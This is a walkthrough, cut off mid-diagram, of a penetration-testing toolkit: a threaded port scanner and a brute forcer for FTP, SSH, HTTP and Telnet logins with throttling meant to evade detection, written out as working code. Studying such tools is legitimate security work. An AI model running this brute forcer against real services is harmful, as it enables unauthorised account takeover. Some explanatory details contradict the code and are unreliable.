# Advanced Penetration Testing Toolkit - Code Walkthrough

**A Complete Line-by-Line Explanation of Every Module**

---

## Table of Contents

1. [Overview & Architecture](#overview--architecture)
2. [Module: Port Scanner](#module-port-scanner)
3. [Module: Brute Forcer](#module-brute-forcer)
4. [Module: Configuration Manager](#module-configuration-manager)
5. [Module: Reporting System](#module-reporting-system)
6. [Module: Exception Handling](#module-exception-handling)
7. [CLI Entry Point (appt)](#cli-entry-point-appt)
8. [Utility Functions](#utility-functions)
9. [Data Flow Diagrams](#data-flow-diagrams)

---

## Overview & Architecture

### High-Level Design

```
┌─────────────────────────────────────────────────────────────┐
│                    APPT Entry Point (appt)                  │
│                    - Parse arguments                        │
│                    - Route to scan/brute commands            │
└──────────────────────┬──────────────────────────────────────┘
                       │
        ┌──────────────┴──────────────┐
        │                             │
   ┌────▼──────────────┐    ┌────────▼──────────┐
   │  Port Scanner     │    │   Brute Forcer    │
   │                   │    │                   │
   │ scan_port()       │    │ attempt_login()   │
   │ worker()          │    │ worker()          │
   │ scan()            │    │ attack()          │
   └────┬──────────────┘    └────────┬──────────┘
        │                            │
        └────────────┬───────────────┘
                     │
        ┌────────────▼──────────────┐
        │  Report Generator         │
        │                           │
        │ generate_json_report()    │
        │ generate_html_report()    │
        │ generate_csv_report()     │
        │ export_all_formats()      │
        └────────────┬──────────────┘
                     │
        ┌────────────▼──────────────┐
        │  Output Files             │
        │                           │
        │ .json, .csv, .html, .xml  │
        └───────────────────────────┘
```

### Technology Stack

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **Threading** | `threading.Thread`, `Queue` | Multi-threaded scanning/attacking |
| **Networking** | `socket` | TCP connection testing |
| **SSH** | `paramiko` | SSH protocol support |
| **HTTP** | `requests` | HTTP/HTTPS brute forcing |
| **Data Structure** | `dataclasses` | Type-safe credential objects |
| **Enumeration** | `enum.Enum` | Attack mode definitions |
| **Reporting** | JSON/CSV/HTML/XML | Multiple output formats |

---

## Module: Port Scanner

**File:** `src/port_scanner.py`  
**Lines:** 231  
**Purpose:** Scan target for open ports and identify services

### 1. Service Fingerprints Dictionary (Lines 13-32)

```python
SERVICE_FINGERPRINTS = {
    21: {"name": "FTP", "probe": b"", "response_patterns": [b"220"]},
    22: {"name": "SSH", "probe": b"", "response_patterns": [b"SSH"]},
    # ... more ports
}
```

**Logic:**
- Maps port numbers to service information
- `probe`: Data sent to service for fingerprinting
- `response_patterns`: Expected responses for service identification
- Used to identify what service is running on each open port

### 2. Common Ports List (Line 35)

```python
COMMON_PORTS = [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5900, 8080, 8443]
```

**Logic:**
- Hardcoded list of frequently used ports
- Used for "quick scan" mode to speed up scanning
- Covers FTP, SSH, HTTP, DNS, SMTP, MySQL, RDP, etc.

### 3. PortScanner Class (Lines 38-231)

#### Constructor (Lines 40-50)

```python
def __init__(self, host: str, timeout: float = 2.0, verbose: bool = False):
    self.host = host                    # Target IP/hostname
    self.timeout = timeout              # Connection timeout
    self.verbose = verbose              # Verbose output flag
    self.open_ports = []                # Store open ports found
    self.lock = Lock()                  # Thread-safe access to open_ports
    self.start_time = None              # Track scan duration
    self.total_ports = 0                # Total ports to scan
    self.scanned = 0                    # Ports scanned so far
```

**Logic:**
- Initializes scanner state
- `lock` ensures thread-safe list operations
- `timeout` prevents hanging on unresponsive ports

#### get_service_name() (Lines 52-56)

```python
def get_service_name(self, port: int) -> str:
    if port in SERVICE_FINGERPRINTS:
        return SERVICE_FINGERPRINTS[port]["name"]
    return "Unknown"
```

**Logic:**
- Looks up port in fingerprint dictionary
- Returns human-readable service name (e.g., "SSH" for port 22)
- Returns "Unknown" for ports not in dictionary

#### scan_port() - Core Scanning Logic (Lines 58-97)

```python
def scan_port(self, port: int) -> Tuple[bool, Optional[str]]:
    try:
        # Create TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        # Attempt connection (result == 0 means success)
        result = sock.connect_ex((self.host, port))
        
        if result == 0:
            # PORT IS OPEN
            service = self.get_service_name(port)
            version = None
            
            # Try fingerprinting if probe available
            if port in SERVICE_FINGERPRINTS:
                version = self._fingerprint_service(port)
            
            # Thread-safe: Add to open ports list
            with self.lock:
                port_info = {
                    "port": port,
                    "service": service,
                    "version": version,
                    "state": "open"
                }
                self.open_ports.append(port_info)
                print(f"🟢 {port:5d}/tcp  {service:15} {version or ''}")
            
            sock.close()
            return True, service
        
        # PORT IS CLOSED
        if self.verbose:
            sys.stdout.write(f"\r⚫ Scanning: {self.scanned}/{self.total_ports}")
            sys.stdout.flush()
        
        sock.close()
        return False, None
        
    except socket.timeout:
        if self.verbose:
            print(f"⏱️  Port {port}: Timeout")
    except Exception as e:
        if self.verbose:
            print(f"❌ Port {port}: {str(e)[:50]}")
    
    return False, None
```

**Logic Flow:**
1. Create TCP socket
2. Set timeout to prevent hanging
3. Attempt connection using `connect_ex()` (returns 0 if successful)
4. If open (result == 0):
   - Get service name
   - Attempt service fingerprinting
   - Safely append to list using lock
   - Print discovery
5. Handle timeouts and errors gracefully
6. Return boolean result

**Thread Safety:**
- Uses `Lock()` to ensure only one thread modifies `open_ports` at a time
- Prevents race conditions when multiple threads write simultaneously

#### _fingerprint_service() (Lines 99-118)

```python
def _fingerprint_service(self, port: int) -> Optional[str]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.host, port))
        
        # Send probe if available
        fingerprint = SERVICE_FINGERPRINTS.get(port, {})
        if fingerprint.get("probe"):
            sock.send(fingerprint["probe"])
        
        # Receive banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        
        # Parse banner for version info
        if banner:
            return banner[:50]  # Return first 50 chars
    except:
        pass
    
    return None
```

**Logic:**
- Connects to port and sends probe data
- Receives service banner/response
- Extracts version info from banner
- Returns first 50 characters (for display)

#### worker() - Thread Worker (Lines 120-139)

```python
def worker(self, queue: Queue):
    while True:
        try:
            port = queue.get(timeout=1)  # Wait max 1 second
        except Empty:
            break
        
        if port is None:
            break
        
        self.scan_port(port)  # Scan the port
        
        with self.lock:
            self.scanned += 1  # Update progress counter
        
        queue.task_done()
```

**Logic:**
- Runs in separate thread
- Gets port number from queue
- Scans the port
- Increments progress counter (thread-safe)
- Continues until queue is empty

#### parse_port_spec() - Parse Port Input (Lines 141-158)

```python
def parse_port_spec(self, port_spec: str) -> List[int]:
    ports = []
    try:
        if "-" in port_spec:
            # Range: "1-1000"
            start, end = port_spec.split("-")
            ports = list(range(int(start.strip()), int(end.strip()) + 1))
        elif "," in port_spec:
            # List: "80,443,22"
            ports = [int(p.strip()) for p in port_spec.split(",")]
        else:
            # Single port: "22"
            ports = [int(port_spec.strip())]
    except ValueError:
        print(f"❌ Invalid port specification: {port_spec}")
        return []
    
    # Filter to valid ports (1-65535)
    return [p for p in ports if 1 <= p <= 65535]
```

**Logic:**
- Parses various port formats:
  - Range: `1-1000` → list of ports 1 to 1000
  - List: `80,443,22` → list of specified ports
  - Single: `22` → list with single port
- Validates each port is in range 1-65535

#### scan() - Main Scanning Function (Lines 160-196)

```python
def scan(self, ports: List[int], num_threads: int = 20) -> List[Dict]:
    self.total_ports = len(ports)
    
    print(f"\n🔍 Port Scan Summary")
    print(f"   Target: {self.host}")
    print(f"   Ports: {len(ports)}")
    print(f"   Threads: {num_threads}")
    print("-" * 60)
    
    self.start_time = time()
    queue = Queue()
    threads = []
    
    # Create worker threads
    for _ in range(min(num_threads, len(ports))):
        t = Thread(target=self.worker, args=(queue,), daemon=True)
        t.start()
        threads.append(t)
    
    # Queue all ports
    for port in ports:
        queue.put(port)
    
    # Wait for all ports to be scanned
    queue.join()
    
    # Stop workers
    for _ in range(num_threads):
        queue.put(None)  # Signal stop
    for t in threads:
        t.join()  # Wait for threads to finish
    
    elapsed = time() - self.start_time
    print("-" * 60)
    
    # Print summary
    if self.open_ports:
        print(f"\n✅ {len(self.open_ports)} open port(s) found:")
        for p in sorted(self.open_ports, key=lambda x: x["port"]):
            print(f"   {p['port']:5d}/tcp {p['service']:15} {p['version'] or ''}")
    else:
        print(f"\n❌ No open ports found")
    
    print(f"\n📊 Scan Statistics:")
    print(f"   Ports: {len(ports)}")
    print(f"   Time: {elapsed:.2f}s")
    print(f"   Rate: {len(ports)/elapsed:.1f} ports/sec")
    
    return self.open_ports
```

**Logic Flow:**
1. Initialize timing and queue
2. Create `num_threads` worker threads
3. Put all ports into queue
4. Wait for queue to be processed (`queue.join()`)
5. Signal workers to stop with `None` values
6. Wait for threads to finish
7. Calculate statistics and print summary

**Performance:**
- Uses producer-consumer pattern
- Multiple threads allow concurrent port scanning
- Thread count limited to number of ports (no wasted threads)

#### scan() - Convenience Function (Lines 198-211)

```python
def scan(host: str, port_spec: str = "1-1000", timeout: float = 2.0, 
         num_threads: int = 20, quick: bool = False, verbose: bool = False,
         output_format: str = "text") -> List[Dict]:
    scanner = PortScanner(host, timeout, verbose)
    
    if quick:
        ports = COMMON_PORTS  # Use predefined list
    else:
        ports = scanner.parse_port_spec(port_spec)
    
    if not ports:
        return []
    
    results = scanner.scan(ports, num_threads)
    
    if output_format == "json":
        return json.dumps({"host": host, "ports": results}, indent=2)
    
    return results
```

**Logic:**
- Wrapper function for easier usage
- Creates scanner instance
- Selects port list (common or parsed)
- Executes scan
- Returns results in requested format

---

## Module: Brute Forcer

**File:** `src/brute_forcer.py`  
**Lines:** 345  
**Purpose:** Perform password attacks on various network services

### 1. AttackMode Enum (Lines 26-31)

```python
class AttackMode(Enum):
    SINGLE = "single"      # One password per user
    LOOP = "loop"          # All passwords for each user
    COMBO = "combo"        # Paired user:password
```

**Logic:**
- Defines three attack strategies
- **SINGLE:** Each user gets one password (index-paired)
- **LOOP:** Each user tries all passwords
- **COMBO:** Pre-paired credentials from file

### 2. Credential Dataclass (Lines 34-39)

```python
@dataclass
class Credential:
    username: str
    password: str
    
    def __str__(self):
        return f"{self.username}:{self.password}"
```

**Logic:**
- Type-safe credential storage
- Dataclass auto-generates `__init__`, `__eq__`, `__repr__`
- Custom `__str__` for pretty printing

### 3. RateLimiter Class (Lines 42-66)

```python
class RateLimiter:
    def __init__(self, delay: float = 0.1, burst_size: int = 10):
        self.delay = delay          # Seconds between attempts
        self.burst_size = burst_size  # Attempts before enforcing delay
        self.lock = Lock()
        self.last_attempt = time()
        self.burst_count = 0
    
    def wait(self):
        with self.lock:
            self.burst_count += 1
            
            if self.burst_count >= self.burst_size:
                # Allow burst of N attempts, then sleep
                elapsed = time() - self.last_attempt
                if elapsed < self.delay * self.burst_size:
                    # Sleep only if we've gone faster than expected
                    sleep(self.delay * self.burst_size - elapsed)
                self.burst_count = 0
                self.last_attempt = time()
            else:
                # Between attempts, apply base delay
                sleep(self.delay)
```

**Logic:**
- Implements token bucket rate limiting
- Allows burst of attempts, then enforces delay
- Prevents detection by limiting request rate
- Thread-safe using Lock

**Example Timeline (delay=0.1, burst=10):**
```
Attempt 1: sleep(0.1s)
Attempt 2: sleep(0.1s)
...
Attempt 10: sleep(0.1s)
Attempt 11: sleep(0.1s) [resets counter]
Attempt 12: sleep(0.1s)
...
```

### 4. BruteForcer Class - Constructor (Lines 69-100)

```python
class BruteForcer:
    def __init__(self, host: str, port: Optional[int] = None, 
                 protocol: str = "ftp", timeout: float = 5.0,
                 verbose: bool = False):
        self.host = host
        self.port = port
        self.protocol = protocol.lower()
        self.timeout = timeout
        self.verbose = verbose
        
        self._set_default_port()  # Set port based on protocol
        
        self.found_credentials = []
        self.attempts = 0
        self.failures = 0
        self.lock = Lock()
        self.rate_limiter = RateLimiter()
        self.start_time = None
        self.stop_event = Event()
```

**Logic:**
- Initialize attack parameters
- Set default port if not provided
- Create rate limiter for detection avoidance
- Use `Event()` for graceful shutdown

### 5. _set_default_port() (Lines 102-116)

```python
def _set_default_port(self):
    if self.port is None:
        defaults = {
            "ftp": 21,
            "ssh": 22,
            "http": 80,
            "https": 443,
            "telnet": 23,
            "smtp": 25,
            "pop3": 110,
            "imap": 143,
            "mysql": 3306,
            "postgres": 5432,
            "mongodb": 27017,
        }
        self.port = defaults.get(self.protocol, 21)
```

**Logic:**
- Maps protocol names to standard ports
- Uses default FTP port (21) if protocol not found
- Allows user to override with custom port

### 6. Protocol-Specific Login Methods

#### _attempt_ftp() (Lines 118-129)

```python
def _attempt_ftp(self, username: str, password: str) -> bool:
    try:
        with ftplib.FTP(self.host, timeout=self.timeout) as ftp:
            ftp.login(user=username, passwd=password)
            return True  # Successful login
    except ftplib.error_perm:
        return False  # Authentication failed
    except Exception as e:
        if self.verbose:
            print(f"⚠️  FTP error: {str(e)[:50]}")
        return None  # Error (different from failed auth)
```

**Logic:**
- Return values have different meanings:
  - `True` = Successful authentication
  - `False` = Authentication failed
  - `None` = Network/protocol error
- Uses context manager (`with`) for automatic cleanup
- Catches permission errors vs other exceptions

#### _attempt_ssh() (Lines 131-153)

```python
def _attempt_ssh(self, username: str, password: str) -> bool:
    if not paramiko:
        print("❌ paramiko not installed...")
        return None
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=self.host,
            port=self.port,
            username=username,
            password=password,
            timeout=self.timeout,
            allow_agent=False,        # Don't use SSH agent
            look_for_keys=False,      # Don't check local keys
            banner_timeout=self.timeout
        )
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        if self.verbose:
            print(f"⚠️  SSH error: {str(e)[:50]}")
        return None
```

**Logic:**
- Uses Paramiko SSH library
- Disables agent/key auth to force password
- Catches authentication exceptions separately
- Closes connection properly

#### _attempt_http() (Lines 155-177)

```python
def _attempt_http(self, username: str, password: str, https: bool = False) -> bool:
    if not requests:
        print("❌ requests not installed...")
        return None
    
    try:
        proto = "https" if https else "http"
        url = f"{proto}://{self.host}:{self.port}/"
        response = requests.get(
            url,
            auth=(username, password),  # HTTP Basic Auth
            timeout=self.timeout,
            verify=False  # Ignore SSL warnings
        )
        # Status < 401 = success (200, 301, etc)
        # Status >= 401 = auth failed (401, 403, etc)
        return response.status_code < 401
    except Exception as e:
        if self.verbose:
            print(f"⚠️  HTTP error: {str(e)[:50]}")
        return None
```

**Logic:**
- Uses HTTP Basic Authentication
- Success = Status code < 401
- Failure = Status code 401/403
- Ignores SSL verification for self-signed certs

#### _attempt_telnet() (Lines 179-200)

```python
def _attempt_telnet(self, username: str, password: str) -> bool:
    try:
        import telnetlib
        tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
        
        # Wait for login prompt
        tn.read_until(b"login:", timeout=2)
        tn.write(username.encode() + b"\n")
        
        # Wait for password prompt
        tn.read_until(b"Password:", timeout=2)
        tn.write(password.encode() + b"\n")
        
        # Check response
        response = tn.read_very_eager().decode(errors='ignore')
        tn.close()
        
        # Success if no rejection words found
        return "incorrect" not in response.lower() and "denied" not in response.lower()
    except Exception:
        return None
```

**Logic:**
- Interactive Telnet protocol
- Waits for expected prompts
- Sends credentials at appropriate times
- Heuristic: No "incorrect" or "denied" = success

### 7. attempt_login() - Protocol Dispatcher (Lines 202-217)

```python
def attempt_login(self, username: str, password: str) -> Optional[bool]:
    if self.protocol == "ftp":
        return self._attempt_ftp(username, password)
    elif self.protocol == "ssh":
        return self._attempt_ssh(username, password)
    elif self.protocol == "http":
        return self._attempt_http(username, password, https=False)
    elif self.protocol == "https":
        return self._attempt_http(username, password, https=True)
    elif self.protocol == "telnet":
        return self._attempt_telnet(username, password)
    
    return None
```

**Logic:**
- Routes to appropriate protocol handler
- Single entry point for all authentication attempts
- Makes code extensible for adding new protocols

### 8. worker() - Attack Worker Thread (Lines 219-251)

```python
def worker(self, queue: Queue):
    while not self.stop_event.is_set():
        try:
            credential = queue.get(timeout=1)
        except Empty:
            break
        
        if credential is None:
            break
        
        # Rate limiting for detection avoidance
        self.rate_limiter.wait()
        
        # Attempt login
        result = self.attempt_login(credential.username, credential.password)
        
        with self.lock:
            self.attempts += 1
            
            if result is True:
                # SUCCESS!
                self.found_credentials.append(credential)
                print(f"\n🟢 ✓ SUCCESS! {credential}")
                
                # Optional: Stop after first success
                if hasattr(self, 'stop_on_success') and self.stop_on_success:
                    self.stop_event.set()
            
            elif result is False:
                # Failed attempt
                self.failures += 1
                if self.verbose:
                    print(f"  ✗ {credential} - Failed")
        
        queue.task_done()
```

**Logic:**
- Worker thread for brute force
- Gets credentials from queue
- Applies rate limiting
- Attempts login
- Updates stats thread-safely
- Can stop on first success
- Continues until queue empty or stop_event set

### 9. attack() - Main Attack Function (Lines 253-308)

```python
def attack(self, usernames: List[str], passwords: List[str], 
           num_threads: int = 10, attack_mode: AttackMode = AttackMode.LOOP,
           stop_on_success: bool = False) -> List[Credential]:
    
    self.stop_on_success = stop_on_success
    
    # Generate credential pairs
    credentials = self._generate_credentials(usernames, passwords, attack_mode)
    
    if not credentials:
        print("❌ No credentials to test")
        return []
    
    print(f"\n🔓 {self.protocol.upper()} Brute Force Attack")
    print(f"   Target: {self.host}:{self.port}")
    print(f"   Usernames: {len(usernames)}")
    print(f"   Passwords: {len(passwords)}")
    print(f"   Attack mode: {attack_mode.value}")
    print(f"   Total attempts: {len(credentials)}")
    print(f"   Threads: {num_threads}")
    print("-" * 60)
    
    self.start_time = time()
    queue = Queue()
    threads = []
    
    # Create worker threads
    for _ in range(min(num_threads, len(credentials))):
        t = Thread(target=self.worker, args=(queue,), daemon=True)
        t.start()
        threads.append(t)
    
    # Queue all credentials
    for cred in credentials:
        queue.put(cred)
    
    # Wait for all attempts
    queue.join()
    
    # Stop workers
    self.stop_event.set()
    for _ in range(num_threads):
        queue.put(None)
    for t in threads:
        t.join()
    
    elapsed = time() - self.start_time
    print("-" * 60)
    
    # Print summary
    print(f"\n📊 Attack Summary:")
    print(f"   Attempts: {self.attempts}")
    print(f"   Successes: {len(self.found_credentials)}")
    print(f"   Failures: {self.failures}")
    print(f"   Time: {elapsed:.2f}s")
    if elapsed > 0:
        print(f"   Rate: {self.attempts/elapsed:.1f} attempts/sec")
    
    if self.found_credentials:
        print(f"\n✅ Credentials found:")
        for cred in self.found_credentials:
            print(f"   {cred}")
    else:
        print(f"\n❌ No valid credentials found")
    
    return self.found_credentials
```

**Logic Flow:**
1. Generate credential pairs from usernames/passwords
2. Print attack summary
3. Create worker threads
4. Queue all credentials
5. Wait for completion
6. Signal stop and wait for threads
7. Calculate statistics and print summary

**Similar to port scanner but for credentials instead of ports**

### 10. _generate_credentials() (Lines 310-327)

```python
def _generate_credentials(self, usernames: List[str], passwords: List[str],
                         attack_mode: AttackMode) -> List[Credential]:
    credentials = []
    
    if attack_mode == AttackMode.SINGLE:
        # One password per user (index-paired)
        for i, user in enumerate(usernames):
            if i < len(passwords):
                credentials.append(Credential(user, passwords[i]))
    
    elif attack_mode == AttackMode.LOOP:
        # All passwords for each user
        for user in usernames:
            for passwd in passwords:
                credentials.append(Credential(user, passwd))
    
    elif attack_mode == AttackMode.COMBO:
        # Paired from file (index-paired)
        for user, passwd in zip(usernames, passwords):
            credentials.append(Credential(user, passwd))
    
    return credentials
```

**Logic Examples:**

**SINGLE Mode (1 × N):**
```
users: [alice, bob, charlie]
pass:  [pass1, pass2, pass3]
Result:
  alice:pass1
  bob:pass2
  charlie:pass3
```

**LOOP Mode (N × M):**
```
users: [alice, bob]
pass:  [pass1, pass2]
Result:
  alice:pass1
  alice:pass2
  bob:pass1
  bob:pass2
```

**COMBO Mode (Paired):**
```
Assumes paired format: user1:pass1, user2:pass2, ...
Result: Zips usernames and passwords together
```

---

## Module: Configuration Manager

**File:** `src/config_manager.py`  
**Purpose:** Load and manage YAML configuration profiles

### Key Classes

#### ConfigManager (Main Controller)

```python
class ConfigManager:
    def __init__(self, config_file: str = "config/default.conf"):
        self.config = {}
        self.profiles = {}
        self.load_config(config_file)
        self.load_profiles()
    
    def load_config(self, filepath: str):
        """Load INI-format configuration"""
        # Reads default settings
    
    def load_profiles(self):
        """Load YAML attack profiles"""
        # Reads from config/example_profiles.yaml
    
    def get_profile(self, name: str) -> Dict:
        """Get profile by name"""
        # Returns profile configuration
    
    def merge_args_with_profile(self, args, profile_name: str):
        """Merge CLI arguments with profile settings"""
        # CLI args override profile
```

### Profile Structure

```yaml
quick_scan:
  description: "Scan common ports only"
  scanner:
    timeout: 2.0
    threads: 50
    ports: "1-10000"
  
ssh_bruteforce:
  description: "SSH brute force attack"
  bruteforcer:
    protocol: ssh
    port: 22
    attack_mode: loop
    delay: 0.5
    threads: 20
```

---

## Module: Reporting System

**File:** `src/reporting.py`  
**Purpose:** Generate reports in multiple formats

### Key Classes

#### ReportGenerator

```python
class ReportGenerator:
    def __init__(self, output_dir: Path = Path("output")):
        self.output_dir = output_dir
        self.results = []  # ScanResult objects
        self.credentials = []  # CredentialResult objects
        self.summaries = []  # AttackSummary objects
    
    def add_scan_result(self, result: ScanResult):
        """Add port scan result"""
        self.results.append(result)
    
    def add_credential_result(self, result: CredentialResult):
        """Add credential discovery"""
        self.credentials.append(result)
    
    def generate_json_report(self, filename: str) -> str:
        """Export JSON format"""
    
    def generate_csv_report(self, filename: str) -> str:
        """Export CSV format"""
        # Skips if no results (see Bug Fixes)
    
    def generate_html_report(self, filename: str) -> str:
        """Export interactive HTML dashboard"""
        # Uses pre-calculated success_rate (see Bug Fixes)
    
    def generate_xml_report(self, filename: str) -> str:
        """Export XML format"""
    
    def export_all_formats(self, prefix: str) -> List[str]:
        """Export all formats (JSON, CSV, HTML, XML)"""
        # Returns list of created files
```

### Report Classes

```python
@dataclass
class ScanResult:
    """Individual port scan result"""
    target: str
    port: int
    service: str
    version: Optional[str] = None
    status: str = "open"

@dataclass
class CredentialResult:
    """Successful credential discovery"""
    target: str
    username: str
    password: str
    protocol: str
    status: ResultStatus

@dataclass
class AttackSummary:
    """Summary statistics for an attack"""
    attack_type: str
    target: str
    start_time: str
    end_time: str
    duration: float
    total_attempts: int
    successful: int
    failed: int
    errors: int
    success_rate: float
```

### HTML Report Features

- Interactive dashboard
- Service summary statistics
- Timeline visualization
- Sortable port table
- Export buttons

---

## Module: Exception Handling

**File:** `src/exceptions.py`  
**Purpose:** Enterprise-grade logging and error handling

### EnterpriseLogger

```python
class EnterpriseLogger:
    def __init__(self, log_file: str = "logs/appt.log"):
        self.log_file = log_file
        self.logger = logging.getLogger("APPT")
    
    def info(self, message: str, metadata: Dict = None):
        """Log info message with optional metadata"""
    
    def warning(self, message: str):
        """Log warning"""
    
    def error(self, message: str, error: Exception = None):
        """Log error with exception details"""
    
    def audit(self, action: str, target: str, result: str):
        """Log security-relevant action"""
```

### Retry Decorator

```python
@retry(max_attempts=3, backoff=ExponentialBackoff())
def unreliable_operation():
    # Automatically retried on failure
```

Features:
- Exponential backoff with jitter
- Maximum retry count
- Configurable delays

---

## CLI Entry Point (appt)

**File:** `appt`  
**Lines:** 227  
**Purpose:** Command-line interface for the toolkit

### Structure

```
appt (entry point)
  ├── parse_args()          # Parse CLI arguments
  ├── scan command
  │   ├── Parse target(s)
  │   ├── Parse port spec
  │   └── Call PortScanner.scan()
  └── brute command
      ├── Parse target(s)
      ├── Load usernames
      ├── Load passwords
      └── Call BruteForcer.attack()
```

### Key Functions

#### create_parser() (Lines 19-66)

```python
def create_parser():
    parser = argparse.ArgumentParser(
        description="Advanced Penetration Testing Toolkit (APPT)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  appt scan 192.168.1.1 --quick
  appt brute 192.168.1.1 -u admin -w passwords.txt
...
        """
    )
    
    # Global options
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-t", "--threads", type=int, default=20)
    parser.add_argument("--output", "-o", help="Output file")
    
    # Subcommands
    subparsers = parser.add_subparsers(dest="command")
    
    # scan subcommand
    scan_parser = subparsers.add_parser("scan", help="Port Scanner")
    scan_parser.add_argument("target", help="Target IP/hostname or file")
    scan_parser.add_argument("-p", "--ports", default="1-1000")
    scan_parser.add_argument("--quick", action="store_true")
    ...
    
    # brute subcommand
    brute_parser = subparsers.add_parser("brute", help="Brute Force")
    brute_parser.add_argument("target", help="Target IP/hostname")
    brute_parser.add_argument("-u", "--username", help="Single username")
    brute_parser.add_argument("-w", "--wordlist", default="wordlists/passwords.txt")
    ...
    
    return parser
```

**Logic:**
- Creates argument parser with subcommands
- `scan` command for port scanning
- `brute` command for brute forcing
- Global options available to all commands

#### main() Function (Lines 68-227)

```python
def main():
    parser = create_parser()
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # SCAN COMMAND
    if args.command == "scan":
        if args.target.endswith(".txt"):
            targets = load_wordlist(args.target)
        else:
            targets = [args.target]
        
        ports = args.ports  # Parse in scanner
        
        for target in targets:
            print(f"\n🎯 Scanning {target}")
            results = scan_ports(
                target,
                port_spec=ports,
                timeout=args.timeout,
                num_threads=args.threads,
                quick=args.quick,
                verbose=args.verbose
            )
            
            if args.output:
                save_results(results, args.output)
    
    # BRUTE FORCE COMMAND
    elif args.command == "brute":
        # Load targets
        targets = [args.target]  # Could be from file too
        
        # Load credentials
        usernames = []
        if args.username:
            usernames = [args.username]
        elif args.userlist:
            usernames = load_wordlist(args.userlist)
        
        passwords = load_wordlist(args.wordlist)
        
        if not usernames or not passwords:
            print("❌ No usernames or passwords loaded")
            return
        
        for target in targets:
            print(f"\n🎯 Attacking {target}")
            creds = attack(
                target,
                usernames,
                passwords,
                protocol=args.protocol,
                port=args.port,
                num_threads=args.threads,
                timeout=args.timeout,
                attack_mode=args.attack_mode,
                stop_on_success=args.stop_on_success,
                verbose=args.verbose
            )
            
            if args.output:
                save_results([vars(c) for c in creds], args.output)
```

**Logic Flow:**
1. Parse command-line arguments
2. Determine which command (scan/brute)
3. Load target(s) from file or argument
4. For scan: Parse ports and execute scan
5. For brute: Load usernames and passwords, execute attack
6. Save results if output file specified

---

## Utility Functions

**File:** `src/utils.py`

### is_valid_ip() (Lines 12-25)

```python
def is_valid_ip(host: str) -> bool:
    # IPv4 validation
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ipv4_pattern, host):
        try:
            socket.inet_aton(host)
            return True
        except socket.error:
            return False
    
    # Hostname validation
    hostname_pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$'
    if re.match(hostname_pattern, host):
        return True
    
    return False
```

**Logic:**
- Validates IPv4 addresses (regex + socket check)
- Validates hostnames (FQDN format)
- Returns False for invalid input

### load_wordlist() (Lines 28-37)

```python
def load_wordlist(filepath: str) -> List[str]:
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ File not found: {filepath}")
        return []
    except Exception as e:
        print(f"❌ Error reading file: {e}")
        return []
```

**Logic:**
- Reads lines from file
- Strips whitespace
- Skips empty lines
- Handles missing files gracefully

### save_results() (Lines 40-56)

```python
def save_results(results: List[Dict], output_file: str, format: str = "json"):
    try:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format == "json":
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
        elif format == "csv":
            import csv
            if results and isinstance(results[0], dict):
                with open(output_file, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=results[0].keys())
                    writer.writeheader()
                    writer.writerows(results)
        
        print(f"✅ Results saved to: {output_file}")
        return True
    except Exception as e:
        print(f"❌ Error saving results: {e}")
        return False
```

**Logic:**
- Creates output directory if needed
- Saves JSON (pretty-printed)
- Saves CSV (headers + rows)
- Handles errors gracefully

---

## Data Flow Diagrams

### Port Scanning Flow

```
┌──────────────┐
│ appt scan    │
│ 192.168.1.1  │
└──────┬───────┘
       │
       ▼
┌──────────────────────┐
│ Create PortScanner   │
│ host=192.168.1.1     │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Parse port spec      │
│ "1-1000" → [1..1000] │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Create 20 workers    │
│ threads              │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Queue ports          │
│ [1, 2, 3, ...]       │
└──────┬───────────────┘
       │
       ▼
    ┌─ ─ ─ ─ ─ ─ ─ ─ ┐
    │ Parallel Loop  │ (20 threads)
    │ for each port: │
    │ 1. Get from Q  │
    │ 2. Scan port   │
    │ 3. If open:    │
    │    print info  │
    │    add to list │
    │ 4. Mark done   │
    │ 5. Get next    │
    └─ ─ ─ ─ ─ ─ ─ ─ ┘
       │
       ▼
┌──────────────────────┐
│ Calculate stats      │
│ - Scan time         │
│ - Ports/sec rate     │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Return open_ports    │
│ [{port:22, svc:SSH}, │
│  {port:80, svc:HTTP}]│
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Save report          │
│ (JSON/CSV/HTML)      │
└──────────────────────┘
```

### Brute Force Attack Flow

```
┌──────────────────────────┐
│ appt brute 192.168.1.1   │
│ -u admin                 │
│ -w passwords.txt         │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│ Create BruteForcer       │
│ host, protocol, timeout  │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│ Load credentials         │
│ [admin:pass1,            │
│  admin:pass2, ...]       │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│ Generate Credential objs │
│ [Cred(admin, pass1),     │
│  Cred(admin, pass2), ...]│
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
